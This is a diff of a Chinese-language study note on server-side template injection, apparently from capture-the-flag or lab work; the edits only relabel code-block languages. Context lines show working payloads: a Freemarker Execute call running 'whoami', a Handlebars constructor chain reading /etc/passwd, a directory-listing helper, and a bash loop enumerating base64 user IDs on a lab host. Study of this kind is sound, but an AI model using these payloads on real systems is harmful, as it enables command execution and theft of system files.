@@ -309,7 +309,7 @@ Freemarker 是 Java 生態系最常見的 Server-Side Template Engine 之一，�
 ![image](https://hackmd.io/_uploads/H1kpvC68-l.png)
 > 包含 Template, name variable 和 reasons array
 
-```java
+```freemarker
 <h1>Hello ${name}!</h1>
 <#if name == "hacker">
 The top reasons you're great:
@@ -329,7 +329,7 @@ The top reasons you're great:
 
 Freemarker 也可以透過 interpolation 運算：\
 Ex. 列出 Array
-```java
+```freemarker
 <#list SECRET_ARRAY as v>
 ${v}
 </#list>
@@ -390,7 +390,7 @@ ${"freemarker.template.utility.Execute"?new()("whoami")}
 >[!Note]
 > Pug 不需要 `<` `>`，行首就是 tag
 
-```js
+```pug
 h1 Hello, #{name}
 input(type='hidden' name='admin' value='true')
 
@@ -636,7 +636,7 @@ client-side Handlebars template
 [環境範例]\
 ![image](https://hackmd.io/_uploads/rkS_NE0IWg.png)
 
-```js
+```handlebars
 <h1>Hello {{name}}</h1>
 {{#if nicknames}}
 Also known as:
@@ -673,7 +673,7 @@ Handlebars 允許:
 - `{{this.constructor.constructor}}`
 
 可以構造出 Payload:
-```js
+```handlebars
 {{#with "s" as |string|}}
   {{#with string.constructor as |Function|}}
     {{Function "return require('fs').readFileSync('/etc/passwd','utf8')"}}
@@ -708,7 +708,7 @@ handlebars.registerHelper(helpers());
 #### - readdir
 列出目錄
 
-```js
+```handlebars
 {{#each (readdir "/etc")}}
     {{this}}
 {{/each}}
@@ -1891,7 +1891,7 @@ done > uid_b64.txt
 ![image](https://hackmd.io/_uploads/Sy8th2WwWl.png)
 
 2. 轉寫腳本 (1 ~ 200)，若找到 flag 則 break
-```py
+```bash
 for i in $(seq 1 200); do
   b64=$(printf %s "$i" | base64)
   url="http://idor-sandbox:80/challenge/?uid=$b64"
